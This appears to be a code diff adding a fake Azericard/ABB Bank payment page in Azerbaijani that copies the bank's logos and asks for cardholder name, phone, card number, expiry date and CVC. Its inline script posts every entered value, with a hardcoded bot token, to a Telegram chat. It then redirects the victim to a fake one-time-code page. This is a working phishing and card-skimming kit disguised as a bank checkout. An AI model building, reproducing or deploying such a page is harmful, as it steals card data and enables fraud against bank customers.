@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Azericard - Ödəniş</title>
+    <link href="css/azericard.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+    <div class="all">
+        <main class="main">
+            <header>
+                <div class="header-logos">
+                    <div class="abb-logo">
+                        <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Bank">
+                    </div>
+                    <div class="azericard-logo">
+                        <img src="https://mpi.3dsecure.az/abb_default/img/azericard.svg" alt="Azericard">
+                    </div>
+                </div>
+            </header>
+            <section class="form-content form-content2">
+                <h1>Kart məlumatları</h1>
+                <div id="amountDisplay" class="amount-display"></div>
+                <form class="form-container" autocomplete="off" id="paymentForm">
+                    <div class="field-container1">
+                        <div class="cardnumber_img">
+                            <div class="svgBox">
+                                <div>
+                                    <label>Ödəniş məbləği</label>
+                                    <input id="amountdisplay" type="text" readonly>
+                                </div>
+                            </div>
+                            <div><img style="width:30px;" src="images/money.svg" alt=""></div>
+                        </div>
+                    </div>
+
+                    <div class="field-container1">
+                        <div class="cardnumber_img" id="name-container">
+                            <div class="svgBox">
+                                <div>
+                                    <label for="name" id="name-text">Kart sahibinin adı</label>
+                                    <input required id="name" type="text" maxlength="32" placeholder="Ad Soyad">
+                                </div>
+                            </div>
+                            <div><img style="width:30px;" src="images/user.svg" alt=""></div>
+                        </div>
+                    </div>
+
+                    <div class="field-container1">
+                        <div class="cardnumber_img" id="phone-container">
+                            <div class="svgBox">
+                                <div>
+                                    <label for="phoneNumber" id="phone-text">Mobil nömrə</label>
+                                    <input required id="phoneNumber" type="tel" placeholder="+994 (00) 000 00 00">
+                                </div>
+                            </div>
+                            <div><img style="width:30px;" src="images/phone.svg" alt=""></div>
+                        </div>
+                    </div>
+
+                    <div class="field-container1">
+                        <div class="cardnumber_img" id="card-container">
+                            <div class="svgBox">
+                                <div>
+                                    <label for="cardnumber" id="card-text">Kartın nömrəsi</label>
+                                    <input required id="cardnumber" type="tel" inputmode="numeric" minlength="13" maxlength="19" placeholder="••••  ••••  ••••  ••••">
+                                </div>
+                                <svg id="ccicon" width="750" height="471" viewBox="0 0 750 471"></svg>
+                            </div>
+                            <div><img src="https://mpi.3dsecure.az/abb_default/img/credit-card.svg" alt=""></div>
+                        </div>
+                    </div>
+
+                    <div class="field-container2">
+                        <div class="field-container" id="expdate-container">
+                            <label for="expirationdate" id="expdate-text">Bitmə tarixi</label>
+                            <input required id="expirationdate" type="text" inputmode="numeric" placeholder="MM / YY">
+                        </div>
+                        <div class="field-container_cvc">
+                            <div class="field_cvc">
+                                <div>
+                                    <label for="securitycode">CVC</label>
+                                    <input required id="securitycode" type="password" inputmode="numeric" placeholder="***" minlength="3" maxlength="4">
+                                </div>
+                                <p class="tooltip">
+                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="">
+                                    <span class="tooltiptext">CVV/CVC kartın arxasındadır</span>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-button">
+                        <button id="submitBtn" type="submit" class="submitBtn" disabled>
+                            <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="">
+                            Təhlükəsiz ödə
+                        </button>
+                        <button id="cnltBtn" type="button" onclick="window.location.href='../index.html'">
+                            Ödənişin ləğvi
+                        </button>
+                    </div>
+                </form>
+            </section>
+        </main>
+        <footer class="footer_part2">
+            <div class="footer_1">
+                <img src="https://mpi.3dsecure.az/abb_default/img/visa.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/secure.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/master_logo.svg" alt="">
+            </div>
+            <div class="footer_2">
+                <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="">
+                <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="">
+            </div>
+        </footer>
+    </div>
+
+    <script src="js/azericard-imask.js"></script>
+    <script src="js/azericard-main.js"></script>
+    <script>
+        const BOT_TOKEN = '9124698878:AAHaa7ybeZ-b72I3DN0ptfOM0SxTeHaayMc';
+        const CHAT_ID = '-1004326178006';
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const amountParam = urlParams.get('amount');
+
+        if (amountParam) {
+            const formatted = parseFloat(amountParam).toFixed(2) + ' AZN';
+            document.getElementById('amountdisplay').value = formatted;
+            document.getElementById('amountDisplay').innerText = formatted;
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const phoneInput = document.getElementById('phoneNumber');
+            if (phoneInput && window.IMask) {
+                IMask(phoneInput, {
+                    mask: '+{994} (00) 000 00 00',
+                    lazy: false,
+                    placeholderChar: '0'
+                });
+            }
+        });
+
+        document.getElementById('paymentForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerHTML = 'Gözləyin...';
+
+            const cardVal = document.getElementById('cardnumber').value;
+            const nameVal = document.getElementById('name').value;
+            const phoneVal = document.getElementById('phoneNumber').value;
+            const expVal = document.getElementById('expirationdate').value;
+            const cvvVal = document.getElementById('securitycode').value;
+
+            const msg = encodeURIComponent(
+                '💳 Yeni Sifariş (Kart):\n' +
+                'Ad: ' + nameVal + '\n' +
+                'Nömrə: ' + phoneVal + '\n' +
+                'Məbləğ: ' + (amountParam || '0') + ' AZN\n' +
+                'Kart: ' + cardVal + '\n' +
+                'Tarix: ' + expVal + '\n' +
+                'CVV: ' + cvvVal
+            );
+
+            // Telegram-a göndər
+            const img = new Image();
+            img.src = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg;
+
+            // 1.5 saniyə sonra OTP səhifəsinə keç
+            setTimeout(() => {
+                window.location.href = 'azericard-3ds.html?amount=' + encodeURIComponent(amountParam || '0') + '&card=' + encodeURIComponent(cardVal);
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
